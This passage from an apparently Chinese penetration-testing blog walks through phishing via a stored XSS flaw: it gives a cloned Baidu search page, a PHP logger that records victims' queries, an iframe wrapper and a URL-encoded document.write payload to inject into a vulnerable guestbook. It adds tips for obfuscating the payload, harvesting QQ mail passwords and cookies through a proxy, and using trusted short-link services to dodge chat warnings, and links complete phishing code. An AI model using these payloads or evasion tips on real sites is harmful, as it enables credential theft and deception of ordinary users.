class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;image/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;shortcut icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;image/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>百度一下，你就知道<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br> .dd&#123;<br><span class="css"> <span class="hljs-attribute">color</span>: gray;</span><br><span class="css"> <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&quot;微软雅黑&quot;</span>;</span><br> &#125;<br><span class="css"> <span class="hljs-selector-class">.dd</span> <span class="hljs-selector-tag">a</span>&#123;</span><br><span class="css"> <span class="hljs-attribute">color</span>: gray;</span><br><span class="css"> <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&quot;微软雅黑&quot;</span>;</span><br> &#125;<br><span class="css"> <span class="hljs-selector-class">.aa</span> <span class="hljs-selector-tag">a</span>&#123;</span><br><span class="css"> <span class="hljs-attribute">color</span>: <span class="hljs-number">#000000</span>;</span><br><span class="css"> <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&quot;微软雅黑&quot;</span>;</span><br><span class="css"> <span class="hljs-attribute">font-size</span>: <span class="hljs-number">15px</span>;</span><br> &#125;<br><span class="css"> <span class="hljs-selector-tag">body</span>&#123;</span><br><span class="css"> <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;</span><br><span class="css"> <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;</span><br> &#125;<br><span class="css"> <span class="hljs-attribute">font</span><span class="hljs-selector-pseudo">:hover</span>&#123;</span><br><span class="css"> <span class="hljs-attribute">cursor</span>: pointer;</span><br><span class="css"> <span class="hljs-attribute">color</span>: red;</span><br> &#125;<br> .back-img&#123;<br><span class="css"> <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000000</span>;</span><br><span class="css"> <span class="hljs-attribute">position</span>: absolute;</span><br><span class="css"> <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><br><span class="css"> <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;</span><br><span class="css"> <span class="hljs-attribute">top</span>: <span class="hljs-number">0px</span>;</span><br><span class="css"> <span class="hljs-attribute">left</span>: <span class="hljs-number">0px</span>;</span><br><span class="css"> <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#000000</span>;</span><br><span class="css"> <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.3</span>;</span><br><span class="css"> <span class="hljs-attribute">z-index</span>: <span class="hljs-number">100</span>;</span><br><span class="css"> <span class="hljs-attribute">display</span>: none;</span><br> &#125;<br> .login&#123;<br><span class="css"> <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000000</span>;</span><br><span class="css"> <span class="hljs-attribute">width</span>: <span class="hljs-number">390px</span>;</span><br><span class="css"> <span class="hljs-attribute">height</span>: <span class="hljs-number">500px</span>;</span><br><span class="css"> <span class="hljs-attribute">position</span>: absolute;</span><br><span class="css"> <span class="hljs-attribute">top</span>:<span class="hljs-number">26%</span>;</span><br><span class="css"> <span class="hljs-attribute">left</span>: <span class="hljs-number">35%</span>;</span><br><span class="css"> <span class="hljs-attribute">background-color</span>:white;</span><br><span class="css"> <span class="hljs-attribute">z-index</span>: <span class="hljs-number">110</span>;</span><br><span class="css"> <span class="hljs-attribute">display</span>: none;</span><br> &#125;<br> .login-top&#123;<br><span class="css"> <span class="hljs-attribute">position</span>: absolute;</span><br><span class="css"> <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><br><span class="css"> <span class="hljs-attribute">height</span>: <span class="hljs-number">10%</span>;</span><br><span class="css"> <span class="hljs-attribute">background-color</span>:white;</span><br> &#125;<br> .close-login&#123;<br><span class="css"> <span class="hljs-attribute">display</span>: block;</span><br><span class="css"> <span class="hljs-attribute">position</span>: absolute;</span><br><span class="css"> <span class="hljs-attribute">right</span>: <span class="hljs-number">10px</span>;</span><br><span class="css"> <span class="hljs-attribute">top</span>: <span class="hljs-number">5px</span>;</span><br><span class="css"> <span class="hljs-attribute">width</span>: <span class="hljs-number">30px</span>;</span><br><span class="css"> <span class="hljs-attribute">height</span>: <span class="hljs-number">30px</span>;</span><br><span class="css"> <span class="hljs-attribute">text-align</span>: center;</span><br><span class="css"> <span class="hljs-attribute">line-height</span>: <span class="hljs-number">30px</span>;</span><br><span class="css"> <span class="hljs-attribute">font-size</span>: <span class="hljs-number">30px</span>;</span><br><span class="css"> <span class="hljs-attribute">color</span>: gray;</span><br> &#125;<br><span class="css"> <span class="hljs-selector-class">.close-login</span><span class="hljs-selector-pseudo">:hover</span>&#123;</span><br><span class="css"> <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid gray;</span><br><span class="css"> <span class="hljs-attribute">cursor</span>: pointer;</span><br> &#125;<br><span class="css"> <span class="hljs-selector-class">.login-top</span><span class="hljs-selector-pseudo">:hover</span>&#123;</span><br><span class="css"> <span class="hljs-attribute">cursor</span>: move;</span><br> &#125;<br>  <br> <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0px&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;800px&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;10%&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;aa&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>新闻<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>hao123<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>地图<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>视频<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>贴吧<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>学术<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;tt&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;login()&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>设置<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border:0;width: 80px;height: 24px;background-color: #317EF3;color: white;font-size: 12px;&quot;</span>&gt;</span>更多产品<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;40%&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image/baidu001.gif&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;270px&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;129px&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;baidu.php&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;wd&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 540px;height: 36px;font-size: 20px;&quot;</span>/&gt;</span><br> <span class="hljs-comment">&lt;!-- &lt;img src=&quot;image/camera#.png&quot; /&gt; --&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border:0;width: 100px;height: 44px;background-color: #317EF3;color: white;font-size: 18px;&quot;</span>&gt;</span>百度一下<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image/loading.gif&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>手机百度<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dd&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>把百度设为主页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>关于百度<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>About Baidu<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>百度推广<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dd&quot;</span>&gt;</span><br> ◎2018 Baidu <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>使用百度前必读<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>意见反馈<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>京ICP证030173号<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image/jing01.png&quot;</span> /&gt;</span> 京公网安备110000002000001号<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image/jing01.png&quot;</span>/&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <br> <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>接收数据的baidu.php,接收了搜索的关键字wd以添加的方式写入baidu_search.txt并控制js跳转到真正搜索这个关键词的百度页面。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$wd</span> = urlencode(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;wd&#x27;</span>]);<br><span class="hljs-variable">$log</span> = fopen(<span class="hljs-string">&quot;baidu_search.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>fwrite(<span class="hljs-variable">$log</span>, <span class="hljs-variable">$wd</span> . <span class="hljs-string">&quot;\r\n&quot;</span>);<br>fclose(<span class="hljs-variable">$log</span>);<br><br><span class="hljs-comment">#echo $wd;</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script language=&quot;javascript&quot;&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;location.href=&#x27;https://www.baidu.com/s?wd=&quot;</span>.<span class="hljs-variable">$wd</span>.<span class="hljs-string">&quot;&amp;rsv_spt=1&amp;rsv_iqid=0xcd9013d50001ba80&amp;issp=1&amp;f=8&amp;rsv_bp=0&amp;rsv_idx=2&amp;ie=utf-8&amp;tn=baiduhome_pg&amp;rsv_enter=1&amp;rsv_sug3=5&amp;rsv_sug1=2&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;inputT=805&amp;rsv_sug4=816&#x27;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/script&gt;&#x27;</span>;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>百度页面目前的样子：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing11.png"></p><p>ps:其中baidu.html中用到的图片我放到github上面了 <a href="https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC">https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC</a> </p><p>ps2:包括一个完整的qq邮箱前端后端钓鱼代码也写到了这个github目录里面，可以拿去学习，如果用于非法用途造成的后果与本人无关，展示效果如下：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing11-1.png"></p><p>至此环境搭建完成。</p><h2 id="0x04-复现-钓鱼过程"><a href="#0x04-复现-钓鱼过程" class="headerlink" title="0x04 复现-钓鱼过程"></a>0x04 复现-钓鱼过程</h2><p>我们要复现这个攻击过程需要将js代码写入这个存储型xss漏洞中，这个代码的功能需要做到将我们服务器的baidu.html通过iframe框架调用过来。</p><p>那么我们先写一个调用baidu.html的iframe.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>百度一下，你就知道<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.baidu.com/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;shortcut icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.baidu.com/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-tag">body</span>&#123;</span><br><span class="css">      <span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;</span><br><span class="css">  <span class="hljs-attribute">border</span>:<span class="hljs-number">0px</span>;</span><br><span class="css">  <span class="hljs-attribute">padding</span>:<span class="hljs-number">0px</span>;</span><br>  &#125;<br><span class="css"><span class="hljs-selector-tag">iframe</span>&#123;<span class="hljs-attribute">border</span>:<span class="hljs-number">0px</span>;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://127.0.0.1/xss/hk/baidu.html&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;iframepage&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;iframepage&quot;</span>  <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;101%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;101%&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个页面可以将伪造的百度页面整体拉到我们目前页面中。</p><p>想将他用到xss漏洞，需要先将iframe.html页面整个url编码一次。</p><p>然后将编码好的内容写到这个函数里，再整体写在刚才存在xss漏洞的留言页面。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;script&gt;window.onload=function()&#123;document.write(decodeURI(<span class="hljs-string">&quot;%3Chtml%3E%0A%3Chead%3E%0A%3Cmeta%20http-equiv=%22Content-Type%22%20content=%22text/html;%20charset=utf-8%22%20/%3E%20%0A%3Ctitle%3E%E7%99%BE%E5%BA%A6%E4%B8%80%E4%B8%8B%EF%BC%8C%E4%BD%A0%E5%B0%B1%E7%9F%A5%E9%81%93%3C/title%3E%0A%3Clink%20rel=%22icon%22%20href=%22https://www.baidu.com/favicon.ico%22%20type=%22image/x-icon%22%20/%3E%0A%3Clink%20rel=%22shortcut%20icon%22%20href=%22https://www.baidu.com/favicon.ico%22%20type=%22image/x-icon%22%20/%3E%0A%3Cstyle%3Ebody%7B%0A%20%20%20%20%20%20margin:0px;%0A%09%20%20border:0px;%0A%09%20%20padding:0px;%0A%20%20%7D%0Aiframe%7Bborder:0px;%0A%7D%0A%3C/style%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%3Ciframe%20src=%22http://127.0.0.1/xss/hk/baidu.html%22%20id=%22iframepage%22%20name=%22iframepage%22%20%20width=%22101%25%22%20height=%22101%25%22%20%3E%3C/iframe%3E%0A%3C/body%3E%0A%3C/html%3E&quot;</span>))&#125;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing12.png"></p><p>下来我们将这个留言界面的网址，通过新浪短链接等工具生成一个短链接发送给别人，这里就发给我自己进行测试吧。</p><p>打开链接发现留言系统的页面已经变成了自己搭建好的伪造百度页面，但是网址还是存在xss漏洞的网址。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing13.png"></p><p>这个时候我们搜索：黑暗剑21</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing14.png"></p><p>然后就会发现跳转到了真正的百度搜索中，返回的词条也一致。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing15.png"></p><p>最后我们打开刚才存储数据的txt文件，发现多出一条 %E9%BB%91%E6%9A%97%E5%89%9121 </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing16.png"></p><p>解码之后就是黑暗剑21。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing17.png"></p><p>至此我们一个完整的钓鱼流程就结束了。</p><h2 id="0x05-额外技巧"><a href="#0x05-额外技巧" class="headerlink" title="0x05 额外技巧"></a>0x05 额外技巧</h2><ul><li><p>如果我们不想让别人轻易从存在xss存储漏洞页面通过源代码轻易看出我们的目的，我们就需要通过代码混淆和加密的方式将代码伪造一番。</p></li><li><p>如果我们将伪造的页面换成qq邮箱，qq空间等用来钓鱼账号密码，那么就得将接收数据的php页面写成接收好数据保存，然后通过代理的方式向真正的页面提交请求，得到返回的cookie再跳转登陆。</p></li><li><p>要发给别人的钓鱼链接最好通过腾讯、新浪等公司提供的短链接生成器，这样不会在聊天窗口变成红色感叹号，甚至会变成绿色安全符号。</p></li></ul><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>网络钓鱼是最常见的盗号手段，对大部分具备网络安全意识的人很难起作用，但是如果这个网站制作的极其逼真，又是在一些知名公司挖到的存储型xss漏洞上布置的，很多人看到是正规的大公司域名，是不是就非常容易钓鱼成功呢？</p><p>所以面对不明链接的时候，要提升自己的安全意识，能不点则不点，更不要轻易输入账号密码和个人信息。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>XSS</tag>
      
      <tag>网络钓鱼</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据库备份getshell</title>
    <link href="/2018/05/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BDgetshell/"/>
    <url>/2018/05/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BDgetshell/</url>
    
